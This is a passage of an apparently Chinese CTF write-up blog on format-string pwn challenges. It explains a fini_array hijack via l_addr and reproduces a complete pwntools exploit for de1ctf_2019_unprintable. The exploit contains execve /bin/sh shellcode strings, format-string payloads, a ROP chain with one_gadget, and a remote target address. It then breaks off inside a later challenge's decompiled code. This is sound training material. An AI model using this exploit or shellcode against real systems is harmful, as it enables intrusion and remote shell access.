class="headerlink" title="de1ctf_2019_unprintable"></a>de1ctf_2019_unprintable</h1><p>本题的环境是libc-2.23.so的，如果版本不一样会导致栈空间不一样不能getshell（一晚上(lll￢ω￢)得来的</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115389.png" alt="image-20240512214109727"></p><h2 id="静态分析-2"><a href="#静态分析-2" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Ch4r1l3&#x27;s printf test&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This is your gift: %p\n&quot;</span>, v3);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现给了栈的地址，然后关闭了标准输出流，又有一个非栈上的格式化字符串漏洞（0x601060）（buff拉满了（bushi</p><p>这题考到一个小trick：</p><p>exit会调用<code>dl_fini</code>函数，我们看看<code>dl_fini</code>函数的源码</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115390" alt="img"></p><p>会发现执行的时候调用(l-&gt;l_addr+l-&gt;l_info[DY_FINI_ARRAY]-&gt;d_un.d_ptr)，本来l-&gt;l_addr为0，而l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr指针指向程序中的fini_array段的地址，也就是l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr的值为0x0000000000600DD8</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115391.png" alt="image-20240512224201859" style="zoom:33%;" /><p>这时就通过覆盖I-&gt;I_addr来劫持fini_array的地址</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115392.png" alt="image-20240513202751753"></p><p>执行exit中的调用函数（发现雀氏</p><p>发现栈上<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115393.png" alt="image-20240512224609287"></p><p>有个I-&gt;I_addr的地址，就可以通过改这个地址上的值来偏移</p><blockquote><p>其中可以通过看这个与众不同的颜色可以知道这是来自于ld.so文件里的，而这个地址为什么恰好出现在栈上可能是因为在exit函数中，会通过这个来调用dl_fini函数</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115394.png" alt="image-20240512224709178"></p><p>通过fmtarg查偏移（问就是懒（bushi</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =tbs(<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%26$hn&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(read_addr)</span><br></pre></td></tr></table></figure><p>通过这个便可以二次利用read了</p><p>而第二次的printf得到的栈空间有着成堆的rop链，非常好的进行构造</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115395.png" alt="image-20240513195457206"></p><p>1和2指向的都是栈空间，能实现在栈空间的任意写，而2能实现printf_loop，或者rip的任意写</p><p>有了任意写之后就要用ROP来getshell了</p><p>（在此发现这题的exp有点复杂，因此只做思路上的利用，就不打了（等之后再次遇到相似的题目再进行利用≧ ﹏ ≦</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115396.png" alt="image-20240513200455427"></p><p>在libc_csu_init中可以控制rbx rbp r12 r13 r14 r15</p><p>然后有一个rop</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006E8                 adc     <span class="section">[rbp+48h]</span>, edx</span><br></pre></td></tr></table></figure><p>它的作用是将exp+[rbp+48h]的值之后存储在rbp+48h中（最神奇的地方，第一次利用这种rop</p><p>而其中的edx和rbp都是可以控制的，所以我们就可以实现一次任意写。</p><p>可以看到程序空间里存在stderr,stdin,stdout，它们都指向libc，所以可以修改它们为one_gadget来getshell。</p><p>在关闭aslr的情况下stderr和one_gadget分别为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">stderr</span> = <span class="number">0</span>x601040  <span class="comment">#0x7ffff7dd2540</span></span><br><span class="line"><span class="attr">one</span>= <span class="number">0</span>x7ffff7afe147<span class="comment">#0x7ffff7a52216 0x7ffff7a5226a  0x7ffff7afd2a4 0x7ffff7afe147</span></span><br></pre></td></tr></table></figure><p>计算偏移修改即可。</p><p>修改完之后再次利用ret2csu传stderr的地址给r12，**最后调用call qword ptr [r12+rbx*8]**拿到shell。</p><p>（非常好的思路让我大脑旋转</p><p>附上完整exp ：（<a href="https://www.anquanke.com/post/id/183859#h2-0">from</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pdbg=pwn_debug(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pdbg.context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pdbg.local(<span class="string">&quot;&quot;</span>)</span><br><span class="line">pdbg.debug(<span class="string">&quot;2.23&quot;</span>)</span><br><span class="line">pdbg.remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,)</span><br><span class="line"></span><br><span class="line">switch=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> switch==<span class="number">1</span>:</span><br><span class="line">    p=pdbg.run(<span class="string">&quot;local&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> switch==<span class="number">2</span>:</span><br><span class="line">    p=pdbg.run(<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> switch==<span class="number">3</span>:</span><br><span class="line">    p=pdbg.run(<span class="string">&quot;remote&quot;</span>)</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">bp      = <span class="keyword">lambda</span> bkp                :pdbg.bp(bkp)</span><br><span class="line"><span class="comment">#elf=pdbg.elf</span></span><br><span class="line"><span class="comment">#libc=pdbg.libc</span></span><br><span class="line">sh_x86_18=<span class="string">&quot;x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;xf7xe6x50x48xbfx2fx62x69x6ex2fx2fx73x68x57x48x89xe7xb0x3bx0fx05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    pop_rsp=<span class="number">0x40082d</span></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;This is your gift: &#x27;</span>)</span><br><span class="line">    stack=<span class="built_in">int</span>(ru(<span class="string">&#x27;n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#if stack&amp;0xffff&gt;0x2000:</span></span><br><span class="line">    <span class="comment">#   p.close()</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line">    payload1=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%26$hn&#x27;</span></span><br><span class="line">    payload1=payload1.ljust(<span class="number">16</span>,<span class="string">&#x27;x00&#x27;</span>)+p64(<span class="number">0x4007A3</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(payload1)</span><br><span class="line">    bp([<span class="number">0x4007c1</span>])</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload2=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload2)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    stack_tail=(stack-<span class="number">280</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    payload3=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x48</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x48</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(payload3)</span><br><span class="line">    <span class="comment">#get arbitray write</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%13$n&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail+<span class="number">4</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail-<span class="number">4</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%13$n&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)  <span class="comment">#clear up the first arg</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail+<span class="number">4</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail-<span class="number">4</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%13$n&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)<span class="comment">#clear up the first arg</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>) <span class="comment">#fake_heap=0x6010a0</span></span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x10a0</span>-<span class="number">0xa3</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>) <span class="comment">#fake_heap=0x6010a0</span></span><br><span class="line">    payload4=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_tail+<span class="number">2</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-stack_tail-<span class="number">2</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload4)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x60</span>)+<span class="string">&#x27;c%13$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x60</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># merge heap and ROP</span></span><br><span class="line">    prbp = <span class="number">0x400690</span> <span class="comment">#pop rbp;ret;</span></span><br><span class="line">    prsp = <span class="number">0x40082d</span> <span class="comment">#pop rsp r13 r14 r15 ;ret</span></span><br><span class="line">    adc = <span class="number">0x4006E8</span>  </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    adc    DWORD PTR [rbp+0x48],edx</span></span><br><span class="line"><span class="string">    mov    ebp,esp</span></span><br><span class="line"><span class="string">    call   0x400660 &lt;deregister_tm_clones&gt;</span></span><br><span class="line"><span class="string">    pop    rbp</span></span><br><span class="line"><span class="string">    mov    byte ptr [rip + 0x20094e], 1 &lt;0x601048&gt;</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov    eax,0x601017</span></span><br><span class="line"><span class="string">    push   rbp</span></span><br><span class="line"><span class="string">    sub    rax,0x601010</span></span><br><span class="line"><span class="string">    cmp    rax,0xe</span></span><br><span class="line"><span class="string">    mov    rbp,rsp</span></span><br><span class="line"><span class="string">    jbe    0x400690 </span></span><br><span class="line"><span class="string">    pop    rbp</span></span><br><span class="line"><span class="string">    ret   </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    arsp = <span class="number">0x0400848</span> <span class="comment">#add    rsp,0x8;ret</span></span><br><span class="line">    prbx = <span class="number">0x40082A</span> <span class="comment">#pop rbx rbp r12 r13 r14 r15;ret</span></span><br><span class="line">    call = <span class="number">0x400810</span> <span class="comment">#mov    rdx,r13</span></span><br><span class="line">                    <span class="comment">#mov    rsi,r14</span></span><br><span class="line">                    <span class="comment">#mov    edi,r15d</span></span><br><span class="line">                    <span class="comment">#call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line">    stderr = <span class="number">0x601040</span>  <span class="comment">#0x7ffff7dd2540</span></span><br><span class="line">    one= <span class="number">0x7ffff7afe147</span><span class="comment">#0x7ffff7a52216 0x7ffff7a5226a  0x7ffff7afd2a4 0x7ffff7afe147</span></span><br><span class="line">    rop=<span class="number">0x6010a0</span></span><br><span class="line">    payload6 = p64(arsp)*<span class="number">3</span></span><br><span class="line">    <span class="comment">#                   rbx   rbp      r12     r13    r14 r15</span></span><br><span class="line">    payload6 += flat(prbx,<span class="number">0</span>,stderr-<span class="number">0x48</span>,rop,<span class="number">0xFFD2BC07</span>,<span class="number">0</span>,  <span class="number">0</span>,  call)</span><br><span class="line">    payload6 += flat(adc,<span class="number">0</span>,prbx,<span class="number">0</span>,<span class="number">0</span>,stderr,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x400819</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    payload5=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x82d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span></span><br><span class="line">    payload5=payload5.ljust(<span class="number">0x40</span>,<span class="string">&#x27;x00&#x27;</span>)+payload6</span><br><span class="line"></span><br><span class="line">    <span class="comment">#bp([0x4007c1])</span></span><br><span class="line">    sl(payload5)</span><br><span class="line"></span><br><span class="line">    it()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            p=pdbg.run(<span class="string">&quot;local&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="d3ctf-2019-unprintablev"><a href="#d3ctf-2019-unprintablev" class="headerlink" title="d3ctf_2019_unprintablev"></a>d3ctf_2019_unprintablev</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115397.png" alt="image-20240513200949187"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115398.png" alt="image-20240513201206567"></p><p>禁掉了execve</p><p>实力不济（先鸽了</p><h1 id="第六届强网拟态线下赛-fmt"><a href="#第六届强网拟态线下赛-fmt" class="headerlink" title="[第六届强网拟态线下赛]fmt"></a>[第六届强网拟态线下赛]fmt</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115399.png" alt="image-20240512212119545"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Gift: %x\n&quot;</span>, (<span class="type">unsigned</span> __int16)((<span class="type">unsigned</span> __int16)&amp;savedregs - <span class="number">12</span>));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个栈的后四位地址，然后还有一个非栈上的格式化字符串漏洞（一头雾水</p><p>实力不济（先鸽了</p><h1 id="FSCTF-2023-YS-START"><a href="#FSCTF-2023-YS-START" class="headerlink" title="[FSCTF 2023]YS,START!"></a>[FSCTF 2023]YS,START!</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115400.png" alt="image-20240513225857029"></p><p>这题目比较阴间的地方就是不能反汇编，但是有点玄学，就是把ret undefine掉就可以反汇编了，不理解但是大为震撼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// [esp-F6h] [ebp-144h]</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-F2h] [ebp-140h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-EEh] [ebp-13Ch]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-EAh] [ebp-138h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-E6h] [ebp-134h]</span></span><br><span class="line">  <span class="type">int</span> v5; 